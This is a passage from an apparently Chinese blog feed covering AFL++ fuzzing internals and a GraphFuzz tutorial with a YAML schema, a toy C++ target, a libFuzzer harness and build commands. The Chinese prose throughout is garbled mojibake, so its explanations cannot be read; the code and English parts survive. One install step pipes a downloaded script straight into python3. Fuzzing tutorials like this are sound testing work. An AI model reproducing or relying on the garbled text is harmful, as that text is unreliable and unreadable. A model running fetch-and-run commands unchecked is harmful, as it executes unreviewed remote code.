</span>ç¼“å­˜ç§å­æ•°å³å°†è¾¾åˆ°äº†æœ€å¤§ç§å­ç¼“å­˜æ•°ï¼ˆå³ä»…å‰©ä¸‹æœ€åä¸€ä¸ªç¼“å­˜ç©ºä½ï¼‰ï¼Œé‚£ä¹ˆåœ¨<code>afl-&gt;q_testcase_cache</code>æ•°ç»„ä¸­ä¸æ˜¯ç©ºä¸”ä¸æ˜¯æŒ‡å‘å½“å‰ç§å­çš„ä½ç½®ï¼Œé‡Šæ”¾è¯¥ç§å­çš„ç¼“å­˜ï¼Œå³afl-&gt;q_testcase_cache[tid]<strong>-&gt;testcase_buf</strong>ï¼Œå¹¶æ›´æ–°ç›¸å…³å˜é‡å€¼ã€‚åå¤è¿›è¡Œä¸Šè¿°æ“ä½œï¼Œç›´åˆ°ç¼“å­˜èƒ½å¤Ÿæ”¾ä¸‹å½“å‰ç§å­ä¸ºæ­¢ã€‚</p><p>ç„¶åå°†æ–‡ä»¶äºŒè¿›åˆ¶æ•°æ®è¯»å…¥åˆ°<code>q-&gt;testcase_buf</code>ï¼Œå¹¶æ›´æ–°ç›¸å…³å˜é‡å€¼ã€‚</p></li><li><p><code>calibrate_case()</code>ï¼šæ ¡å‡†ä¸€ä¸ªæ–°çš„æµ‹è¯•ç”¨ä¾‹ï¼Œåœ¨å¤„ç†è¾“å…¥ç›®å½•æ—¶å®Œæˆï¼Œä»¥ä¾¿åœ¨æ—©æœŸè­¦å‘Šæœ‰é—®é¢˜çš„æµ‹è¯•ç”¨ä¾‹ï¼ŒåŒæ—¶åœ¨å‘ç°æ–°è·¯å¾„æ—¶æ£€æµ‹å˜é‡è¡Œä¸ºç­‰</p></li><li><p><code>trim_case()</code>ï¼šå¦‚æœæ˜¯æ’æ¡©æ¨¡å¼ã€trim_doneæœªè¿›è¡Œè¿‡ä¸”å¯ç”¨äº†trimï¼Œåˆ™å¯¹æµ‹è¯•ç”¨ä¾‹è¿›è¡Œä¿®å‰ªæ“ä½œã€‚ä¿®å‰ªæ“ä½œçš„ç›®çš„æ˜¯å°½å¯èƒ½å‡å°‘è¾“å…¥æµ‹è¯•ç”¨ä¾‹çš„å¤§å°ï¼Œå› ä¸ºæµ‹è¯•ç”¨ä¾‹çš„å¤§å°ä¼šå½±å“æ¨¡ç³Šæµ‹è¯•çš„é€Ÿåº¦ã€‚è¯¥æ“ä½œè¿›è¡ŒæŒ‡å®šæ­¥é•¿çš„åˆ é™¤æ“ä½œï¼Œç„¶åå°†åˆ é™¤åçš„æµ‹è¯•ç”¨ä¾‹è¿›è¡Œè¿è¡Œï¼Œå¦‚æœtrace_bitsç›¸åŒï¼ˆåˆ é™¤åçš„æµ‹è¯•ç”¨ä¾‹å’ŒåŸæµ‹è¯•ç”¨ä¾‹è§¦å‘ç›¸åŒçš„ç¨‹åºçŠ¶æ€ï¼Œä½†åˆ é™¤åçš„æµ‹è¯•ç”¨ä¾‹å…·æœ‰æ›´å°çš„å¤§å°ï¼‰ï¼Œåˆ™å°†è¯¥åˆ é™¤æ“ä½œå†™å…¥åˆ°æµ‹è¯•ç”¨ä¾‹æ–‡ä»¶ä¸­ã€‚æ³¨ï¼šè¿™é‡Œéœ€è¦åŒæ—¶æ›´æ–°ç¼“å­˜çš„æ•°æ®ã€‚</p></li><li><p><code>calculate_score()</code>ï¼šæ ¹æ®æ‰§è¡Œæ—¶é—´ã€bitmapå¤§å°ã€handicapï¼ˆåæ¥è€…å…è®¸è¿è¡Œæ›´é•¿çš„æ—¶é—´ï¼‰ã€ç§å­æ·±åº¦ã€èƒ½é‡è°ƒåº¦ï¼ˆå†³å®šfactorï¼‰ã€MOPTæ¨¡å¼çš„ä¸€äº›æŒ‡æ ‡ç­‰è®¡ç®—ç§å­å¾—åˆ†</p></li><li><p><strong>ç¡®å®šæ€§å˜å¼‚é˜¶æ®µ</strong>ï¼šå¦‚æœç»™å®šäº†<code>-d</code>ï¼Œåˆ™è·³è¿‡ç¡®å®šæ€§å˜å¼‚é˜¶æ®µï¼›å¦‚æœå…ˆå‰å·²ç»è¿›è¡Œäº†ç¡®å®šæ€§å˜å¼‚ï¼ˆpassed_det=1ï¼‰æˆ–è€…ç§å­å¾—åˆ†æ»¡è¶³æŸä¸ªæ¡ä»¶[å¯¹è¯¥ç§å­è¿›è¡Œç¡®å®šæ€§å˜å¼‚æ€§ä»·æ¯”ä¸é«˜]ï¼Œåˆ™ä¹Ÿéœ€è¦è·³è¿‡ç¡®å®šæ€§å˜å¼‚</p></li><li><p>è·³è¿‡ç¡®å®šæ€§å˜å¼‚åï¼Œå…ˆæ‰§è¡Œ<strong>ç”¨æˆ·è‡ªå®šä¹‰çš„å˜å¼‚é˜¶æ®µ</strong>ï¼Œä¹‹åè¿›å…¥<strong>havocé˜¶æ®µ</strong>ã€‚</p></li><li><p>havocé˜¶æ®µç»“æŸåï¼Œå¯èƒ½ä¼šè¿›å…¥spliceé˜¶æ®µï¼Œè¯¥é˜¶æ®µç”±<code>afl-&gt;ready_for_splicing_count(&gt;1)</code>å†³å®šï¼Œè¯¥å€¼åœ¨<code>add_to_queue()</code>å‡½æ•°ä¸­è¢«æ›´æ–°ï¼Œå½“ç§å­å¤§å°&gt;4æ—¶ï¼Œ<code>afl-&gt;ready_for_splicing_count++</code></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      
      <tag>AFL++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GraphFuzzä½¿ç”¨è¯´æ˜</title>
    <link href="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <url>/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<h1 id="GraphFuzzä½¿ç”¨è¯´æ˜"><a href="#GraphFuzzä½¿ç”¨è¯´æ˜" class="headerlink" title="GraphFuzzä½¿ç”¨è¯´æ˜"></a>GraphFuzzä½¿ç”¨è¯´æ˜</h1><h2 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1. æ¦‚è¿°"></a>1. æ¦‚è¿°</h2><ul><li><p>GraphFuzzæ˜¯ä¸€ä¸ªç”¨äºæ„å»ºç»“æ„æ„ŸçŸ¥ã€åº“APIæ¨¡ç³Šå™¨çš„å®éªŒæ€§æ¡†æ¶</p></li><li><p>è®ºæ–‡ï¼š</p><p>ã€ŠGraphFuzz: Library API Fuzzing with Lifetime-aware Dataflow Graphsã€‹</p></li><li><p>GraphFuzzåŒ…å«ï¼š</p><ul><li><code>gfuzz</code>ï¼šå‘½ä»¤è¡Œå·¥å…·ç”¨æ¥åˆæˆharness</li><li><code>libgraphfuzz</code>ï¼šä¸€ä¸ªè¿è¡Œæ—¶å›¾å˜å¼‚å¼•æ“</li></ul></li><li><p>æ–‡æ¡£ï¼š<a href="https://hgarrereyn.github.io/GraphFuzz">hgarrereyn.github.io/GraphFuzz</a></p></li></ul><h2 id="2-å·¥ä½œæµç¨‹"><a href="#2-å·¥ä½œæµç¨‹" class="headerlink" title="2. å·¥ä½œæµç¨‹"></a>2. å·¥ä½œæµç¨‹</h2><ul><li><p>éœ€è¦åˆ›å»ºä¸€ä¸ªæ¨¡å¼ï¼ˆ**<code>schema</code>**ï¼‰æ¥æè¿°ç›®æ ‡åº“API</p></li><li><p>æ¨¡å¼ä½¿ç”¨äººå¯è¯»çš„TAMLæ ¼å¼ç¼–å†™ï¼Œå¹¶åŒ…å«ä¸€ç³»åˆ—éœ€è¦è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„å‡½æ•°ã€ç±»å’Œç»“æ„ä½“</p><hr><p><strong>schema.yaml</strong>ï¼š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>    <span class="hljs-attr">methods:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Foo()</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">~Foo()</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">foo(int</span> <span class="hljs-string">x,</span> <span class="hljs-string">int</span> <span class="hljs-string">y,</span> <span class="hljs-string">float</span> <span class="hljs-string">z)</span><br><span class="hljs-attr">Bar:</span><br>    <span class="hljs-attr">methods:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Bar(Foo</span> <span class="hljs-string">*,</span> <span class="hljs-string">int)</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">~Bar()</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">bar(int</span> <span class="hljs-string">x)</span><br></code></pre></td></tr></tbody></table></figure></li><li><p>åœ¨è¿è¡Œæ—¶ï¼ŒGraphFuzzå°†ä½¿ç”¨ä¸åŒé¡ºåºå’Œä¸åŒçš„å‚æ•°è°ƒç”¨åº“çš„APIä»¥ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚æœ€é‡è¦çš„æ˜¯ï¼ŒGraphFuzzå°†æ˜ç¡®è·Ÿè¸ªç›®æ ‡çš„ç”Ÿå‘½å‘¨æœŸï¼Œå¹¶ç¡®ä¿æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹éƒ½éµå®ˆç”±æ¨¡å¼å®šä¹‰çš„APIè§„èŒƒ</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++">{ <span class="hljs-comment">// Example 1</span><br>    Foo *v0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Foo</span>();<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>);<br>    Bar *v1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Bar</span>(v0, <span class="hljs-number">1000</span>);<br>    v1-&gt;<span class="hljs-built_in">bar</span>(<span class="hljs-number">123</span>);<br>    del v1;<br>    del v0;<br>}<br>{ <span class="hljs-comment">// Example 2</span><br>    Foo *v0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Foo</span>();<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>);<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>);<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>);<br>    del v0;<br>}<br>{ <span class="hljs-comment">// Example 3</span><br>    Foo *v0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Foo</span>();<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>);<br>    Bar *v1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Bar</span>(v0, <span class="hljs-number">1000</span>);<br>    Bar *v2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Bar</span>(v0, <span class="hljs-number">0</span>);<br>    del v2;<br>    del v1;<br>    del v0;<br>}<br></code></pre></td></tr></tbody></table></figure></li><li><p>ä¸Šè¿°çš„æµ‹è¯•ç”¨ä¾‹å°†è¡¨ç¤ºä¸ºC++æºä»£ç ã€‚ä½†åœ¨GraphFuzzå†…éƒ¨ï¼Œæ¯ä¸ªæµ‹è¯•ç”¨ä¾‹è¡¨ç¤ºä¸ºä¸€ä¸ª<span style="background-color:#ffed99;font-weight:bold">æ•°æ®æµå›¾</span>ï¼Œè¯¥æ•°æ®æµå›¾çš„é¡¶ç‚¹è¡¨ç¤ºä¸ºå‡½æ•°ï¼Œè¾¹è¡¨ç¤ºä¸ºå¯¹è±¡ä¹‹é—´çš„ä¾èµ–ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒGraphFuzzæ— éœ€ä»£ç åˆ†ææˆ–é‡ç¼–è¯‘ä¾¿å¯æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹ï¼›ç›¸åï¼Œå®ƒåŠ¨æ€éå†æ¯ä¸€ä¸ªå›¾ï¼Œè°ƒç”¨æ¯ä¸ªé¡¶ç‚¹çš„ä¸€ä¸ªç«¯ç‚¹</p><p><img src="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/o1.png"></p></li></ul><h2 id="3-å®‰è£…GraphFuzz"><a href="#3-å®‰è£…GraphFuzz" class="headerlink" title="3. å®‰è£…GraphFuzz"></a>3. å®‰è£…GraphFuzz</h2><ul><li>å°†æºç ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå¹¶å®‰è£…ç›¸å…³ä¾èµ–ï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/ForAllSecure/GraphFuzz.git<br>$ sudo apt-get install libprotobuf-dev protobuf-compiler python3-venv python3-pip<br>$ curl -sSL https://install.python-poetry.org | python3 -<br>$ <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>: ** the root path to poetry ** (e.g. /home/chan/.local/bin)<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>libgraphfuzzï¼š</strong></p><ul><li>libgraphfuzzæ˜¯é“¾æ¥åˆ°ä½ çš„æ¨¡ç³Šå™¨harnessçš„ä¸€ä¸ªè¿è¡Œæ—¶å›¾å˜å¼‚åº“ï¼Œå…¶ç”¨C++ç¼–å†™å¹¶ä½¿ç”¨æ ‡å‡†çš„CMakeè¿›è¡Œæ„å»ºï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> GraphFuzz<br>$ <span class="hljs-built_in">mkdir</span> build<br>$ <span class="hljs-built_in">cd</span> build<br>$ cmake ..<br>$ make<br>$ sudo make install<br></code></pre></td></tr></tbody></table></figure><hr><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>gfuzzï¼š</strong></p><ul><li>gfuzzæ˜¯ä¸€ä¸ªpythonå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨æ¥æ„å»ºharnessæ–‡ä»¶å¹¶æ‰§è¡Œå„ç§å„æ ·å…¶ä»–çš„åŠŸèƒ½ï¼ˆå¦‚å›¾æœ€å°åŒ–ï¼‰ã€‚å…¶ä½¿ç”¨Pythonç¼–å†™ï¼Œä½¿ç”¨Poetryæ¥æ„å»ºç³»ç»Ÿï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> .. &amp;&amp; <span class="hljs-built_in">cd</span> cli<br>$ poetry build<br>$ poetry <span class="hljs-built_in">export</span> &gt; dist/requirements.txt<br>$ python3 -m pip install -r dist/requirements.txt<br>$ python3 -m pip install ./dist/gfuzz-*.whl<br></code></pre></td></tr></tbody></table></figure><h2 id="4-åŸºæœ¬ç”¨æ³•"><a href="#4-åŸºæœ¬ç”¨æ³•" class="headerlink" title="4. åŸºæœ¬ç”¨æ³•"></a><span id="basicusage">4. åŸºæœ¬ç”¨æ³•</span></h2><ul><li>æ„å»ºå®éªŒæµ‹è¯•ç¯å¢ƒï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install docker-ce docker-ce-cli containerd.io<br>$ <span class="hljs-built_in">cd</span> .. &amp;&amp; <span class="hljs-built_in">cd</span> experiments<br>$ sudo ./build base<br>$ sudo ./build hello_graphfuzz<br>$ sudo ./run hello_graphfuzz<br></code></pre></td></tr></tbody></table></figure><ul><li><code>hello_graphfuzz</code>æ˜¯ä¸€ä¸ªç®€å•æµ‹è¯•é¡¹ç›®ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªç®€å•çš„C++ç›®æ ‡æ–‡ä»¶<code>lib.h</code>ã€ä¸€ä¸ªæ¨¡å¼é…ç½®æ–‡ä»¶<code>schema.yaml</code></li><li>ä¸€ä¸ªç®€å•çš„C++ç›®æ ‡æ–‡ä»¶<code>lib.h</code>ï¼š</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Foo</span>(): <span class="hljs-built_in">buffer</span>(<span class="hljs-number">0</span>) {}<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">char</span> val)</span> </span>{<br>        buffer.<span class="hljs-built_in">push_back</span>(val);<br>    }<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">check</span><span class="hljs-params">()</span> </span>{<br>        <span class="hljs-keyword">if</span> (buffer.<span class="hljs-built_in">size</span>() &gt;= <span class="hljs-number">4</span> &amp;&amp; \<br>            buffer[<span class="hljs-number">0</span>] == <span class="hljs-string">'F'</span> &amp;&amp; \<br>            buffer[<span class="hljs-number">1</span>] == <span class="hljs-string">'U'</span> &amp;&amp; \<br>            buffer[<span class="hljs-number">2</span>] == <span class="hljs-string">'Z'</span> &amp;&amp; \<br>            buffer[<span class="hljs-number">3</span>] == <span class="hljs-string">'Z'</span><br>        ) {<br>            __builtin_trap();<br>        }<br>    }<br><span class="hljs-keyword">private</span>:<br>    std::vector&lt;<span class="hljs-type">char</span>&gt; buffer;<br>};<br></code></pre></td></tr></tbody></table></figure><ul><li>åœ¨è¿™ä¸ªç›®æ ‡ä¸­ï¼Œæ— æ³•åˆ›å»ºä½¿ç”¨æ ‡å‡†<code>LLVMFuzzerTestOneInput</code>ç±»å‹çš„å•ä¸ªå‡½æ•°çš„harnessã€‚ä½†ä½ å¯ä»¥æŒ‰ç…§å¦‚ä¸‹çš„æ–¹æ³•æ„é€ ä¸€ä¸ªäº‹å®ä¸Šçš„APIæ¨¡ç³Šå™¨ï¼š</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *Data, <span class="hljs-type">size_t</span> Size)</span> </span>{<br>    Foo foo;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; Size; ++i) {<br>        foo.<span class="hljs-built_in">write</span>(Data[i]);<br>    }<br>    foo.<span class="hljs-built_in">check</span>();<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><p>ä¸Šè¿°ç±»å‹çš„harnessæ„é€ éœ€è¦ä¸€äº›å…³äºAPIçš„åŸŸçŸ¥è¯†ï¼Œä½†å¯¹æ¨¡ç³Šå™¨çš„æœç´¢ç©ºé—´è¿›è¡Œäº†é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªbugéœ€è¦åœ¨Foo::checkä¹‹åè°ƒç”¨Foo::writeæˆ–å¤šæ¬¡è°ƒç”¨Foo::checkæ‰èƒ½è§¦å‘ï¼Œé‚£è¯¥å¦‚ä½•æ“ä½œï¼Ÿå› æ­¤ä¸Šè¿°<span style="background-color:#ffed99;font-weight:bold">åŸºäºæ ‡å‡†<code>LLVMFuzzerTestOneInput</code>å­˜åœ¨å±€é™æ€§</span>ï¼Œä¸»è¦çš„é—®é¢˜æ˜¯å…¶è°ƒç”¨åºåˆ—ä¸å˜ï¼Œå› æ­¤ä¸èƒ½è§¦å‘æ›´æ·±å±‚æ¬¡çš„æ¼æ´ã€‚éšç€API surfaceçš„æ‰©å¤§ï¼Œå‡½æ•°çš„äº¤äº’æ–¹å¼ä¹Ÿå‘ˆæŒ‡æ•°çº§å¢åŠ ï¼Œç”Ÿæˆè¿™äº›â€œäº‹å®ä¸Šâ€çš„harnesså˜å¾—æ›´åŠ å›°éš¾ã€‚</p></li><li><p>åœ¨GraphFuzzä¸­ï¼Œä¸€ä¸ªé©±åŠ¨è§è§£æ˜¯ä½¿æ¨¡ç³Šå™¨å¼•æ“æ ¹æ®è¦†ç›–ç‡å¼•å¯¼å˜å¼‚è‡ªè¡Œå‘ç°<span style="background-color:#ffed99;font-weight:bold">APIä½¿ç”¨æ¨¡å¼</span>ï¼šé€šè¿‡å®šä¹‰ä¸€ä¸ªæ¨¡å¼ï¼Œæè¿°æˆ‘ä»¬æƒ³è¦æ¨¡ç³Šæµ‹è¯•çš„æ‰€æœ‰APIç«¯ç‚¹ï¼Œè®©æ¨¡ç³Šå™¨æ„å»ºæµ‹è¯•ç”¨ä¾‹ã€‚</p></li><li><p>schema.yamlï¼š</p></li></ul><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">struct</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Foo</span><br>  <span class="hljs-attr">headers:</span> [<span class="hljs-string">lib.h</span>]<br>  <span class="hljs-attr">methods:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Foo()</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">~Foo()</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">write(char</span> <span class="hljs-string">val)</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">check()</span><br></code></pre></td></tr></tbody></table></figure><ul><li><p>è¯¥æ¨¡å¼æè¿°äº†ä¸€ä¸ªåº“APIä¸­ä¸€ä¸ªå¯¹è±¡<code>struct Foo</code>å’Œå››ä¸ªç«¯ç‚¹ï¼š</p><ul><li><p><code>Foo::Foo()</code>ï¼ˆä¸€ä¸ªæ„é€ å‡½æ•°ï¼‰</p></li><li><p><code>Foo::~Foo()</code> (ä¸€ä¸ªææ„å‡½æ•°)</p></li><li><p><code>Foo::write(char)</code></p></li><li><p><code>Foo::check()</code></p></li></ul></li><li><p>åœ¨æ¨¡å¼ä¸­ï¼Œä»…ç»™å‡ºå‡½æ•°ç­¾åï¼Œä½†GraphFuzzå°è¯•å»æ¨æ–­è¯­ä¹‰ï¼ˆä¾‹å¦‚ï¼ŒFoo:Fooæ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°è€Œä¸æ˜¯ä¸€ä¸ªæ–¹æ³•è°ƒç”¨ï¼‰ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯¥æ¨æ–­æ˜¯å®Œç¾çš„ï¼›ä½†ä¹Ÿç¡®å®é‡åˆ°äº†å¯¹å‚æ•°æœ‰éšå«çº¦æŸçš„å‡½æ•°æˆ–éæ ‡å‡†çš„APIç»“æ„ã€‚å› æ­¤ï¼ŒGraphFuzzä¹Ÿæ”¯æŒä¸€ç§æ›´ç²—ç•¥ã€æ›´çµæ´»çš„ç«¯ç‚¹å£°æ˜ï¼Œç§°ä¸ºè‡ªå®šä¹‰ç«¯ç‚¹ã€‚</p></li></ul><hr><ul><li>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>gfuzz</code>å·¥å…·å»åˆæˆå®é™…çš„C++ harnessæ–‡ä»¶ï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Usage: gfuzz gen [lang] [schema] [output directory]</span><br>$ gfuzz gen cpp schema.yaml .<br></code></pre></td></tr></tbody></table></figure><ul><li>è¿™å°†ä¼šäº§ç”Ÿ3ä¸ªæ–‡ä»¶ï¼š<ul><li><code>fuzz_exec.cpp</code>ï¼šä¸»æ¨¡ç³Šå™¨harness</li><li><code>fuzz_write.cpp</code>ï¼šä¸€ä¸ªé•œåƒharnessï¼Œç”¨äºå°†æ•°æ®æµå›¾è½¬åŒ–ä¸ºæºä»£ç </li><li><code>schema.json</code>ï¼šåœ¨è¿è¡Œæ—¶è¢«GraphFuzzæ‰€ä½¿ç”¨çš„ç±»å‹å…ƒæ•°æ®</li></ul></li></ul><p>:happy: ç”Ÿæˆæ–‡ä»¶å†…å®¹è¯¦è§<a href="#fl1">é™„å½•</a></p><ul><li>æœ€åï¼Œæˆ‘ä»¬ç¼–è¯‘æ¨¡ç³Šå™¨harnessï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang++ -o fuzz_exec fuzz_exec.cpp -fsanitize=fuzzer -lprotobuf -lgraphfuzz<br></code></pre></td></tr></tbody></table></figure><p>æ³¨æ„ï¼šGraphFuzzé€šè¿‡hookçš„æ–¹å¼ä½¿ç”¨libFuzzerï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨libFuzzerçš„åŠŸèƒ½å¦‚ <code>user_value_profile</code>, <code>fork</code>, <code>dict</code> ç­‰ã€‚</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fuzz_exec -use_value_profile=1<br></code></pre></td></tr></tbody></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/o2.png"></p><ul><li>æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹æ–‡ä»¶è¡¨ç¤ºä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®æµå›¾ï¼Œå› æ­¤æˆ‘ä»¬æŸ¥çœ‹crashæ˜¯ä¸å¯è¯»çš„ï¼š</li></ul><p><img src="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/o3.png"></p><ul><li>ä¸ºäº†ä½¿å…¶å¯è¯»ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>fuzz_write</code> harnessä»å›¾ä¸­åˆæˆæºä»£ç ï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang++ -o fuzz_write fuzz_write.cpp -fsanitize=fuzzer -lprotobuf -lgraphfuzz<br></code></pre></td></tr></tbody></table></figure><ul><li>ç„¶åè¿è¡Œ<code>fuzz_write</code>æ¥åˆæˆharnessï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./fuzz_write crash-402bbad640a94933571939f685ea1e9dc4b937f8<br></code></pre></td></tr></tbody></table></figure><figure class="highlight 